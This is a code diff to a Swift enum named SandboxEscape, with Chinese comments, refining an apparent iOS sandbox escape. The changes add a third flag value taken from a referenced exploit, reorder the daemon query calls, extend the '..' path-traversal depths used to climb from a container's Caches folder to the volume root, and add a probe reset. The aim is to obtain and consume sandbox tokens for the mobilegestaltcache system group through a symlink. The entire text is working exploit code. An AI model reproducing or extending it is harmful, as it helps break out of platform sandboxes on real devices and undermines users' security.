@@ -356,9 +356,10 @@ enum SandboxEscape {
 
         // iOS 27 先试标准 flags，iOS 26 先试备用 flags；成功的那组会记下来。
         let preferAlt = preferredAltFlags()
-        let candidates: [UInt64] = preferAlt
+        var candidates: [UInt64] = preferAlt
             ? [altFlags, standardFlags]
             : [standardFlags, altFlags]
+        candidates.append(leaseFlags)
 
         var lastCode: Int64 = -5
         var trail: [String] = []
@@ -415,7 +416,7 @@ enum SandboxEscape {
                     } else {
                         remember(session, key: canonical)
                     }
-                    noteWorkingFlags(flags == altFlags)
+                    noteWorkingFlags(flags)
                     return (session, refused, lastCode)
                 }
             }
@@ -493,7 +494,7 @@ enum SandboxEscape {
                 } else {
                     remember(session, key: canonical)
                 }
-                noteWorkingFlags(flags == altFlags)
+                noteWorkingFlags(flags)
                 return session
             }
 
@@ -531,6 +532,9 @@ enum SandboxEscape {
 
     private static let standardFlags: UInt64 = 0x0000_0080_0000_0000
     private static let altFlags: UInt64 = 0x0000_0008_0000_0000
+    /// 3105 的 MCMRetainedLease 用这组（bit 32 + 35）。bad_query 不用，
+    /// 但 27.3 上另外两组都被拒，多试一组不亏。
+    private static let leaseFlags: UInt64 = 0x0000_0009_0000_0000
     private static var workingFlags: UInt64?
 
     private static func preferredAltFlags() -> Bool {
@@ -540,9 +544,9 @@ enum SandboxEscape {
         return workingFlags == altFlags
     }
 
-    private static func noteWorkingFlags(_ alt: Bool) {
+    private static func noteWorkingFlags(_ value: UInt64) {
         guard workingFlags == nil else { return }
-        workingFlags = alt ? altFlags : standardFlags
+        workingFlags = value
     }
 
     // MARK: - 查询
@@ -598,11 +602,13 @@ enum SandboxEscape {
         let value = xpcString(identifier)
         setGroups(query, value)
         setPart(query, partCaches)
-        setFlags(query, flags)
 
+        // 顺序照 3105 的 bad_query：part → part_domain → flags → 查询。
+        // 先 setFlags 再 setPartDomain 会让 daemon 用旧的 part 解析结果。
         let domain = Array(repeating: "..", count: levels).joined(separator: "/") + path
         let result = domain.withCString { pointer -> UnsafeMutableRawPointer? in
             setPartDomain(query, pointer)
+            setFlags(query, flags)
             return single(query)
         }
         guard let result else {
@@ -626,11 +632,20 @@ enum SandboxEscape {
     /// 从 `<容器>/Library/Caches` 上溯 8 层到卷根。
     private static let containerClassSystemGroup: UInt64 = 13
     private static let systemGroupIdentifier = "systemgroup.com.apple.mobilegestaltcache"
-    private static let systemGroupLevels = [8, 9, 7]
+    private static let systemGroupLevels = [8, 9, 10, 7]
 
     /// 签发通道。part_domain 不动磁盘，成功一次之后就一直用它。
     private static var systemGroupBroken = false
     private static var partDomainBroken = false
+
+    /// 清掉「这条通道不可用」的短期记忆。自检按钮会先调它，
+    /// 否则第一次失败之后，后面的日志里只剩 swap=-6，看不出前两级的结果。
+    static func resetChannelProbe() {
+        gate.lock()
+        defer { gate.unlock() }
+        systemGroupBroken = false
+        partDomainBroken = false
+    }
 
     /// 发一次查询并 consume 拿到的 token。
     /// 前置条件：`<group>/Library/Caches` 此刻已是指向目标路径的符号链接，且已持有 gate。
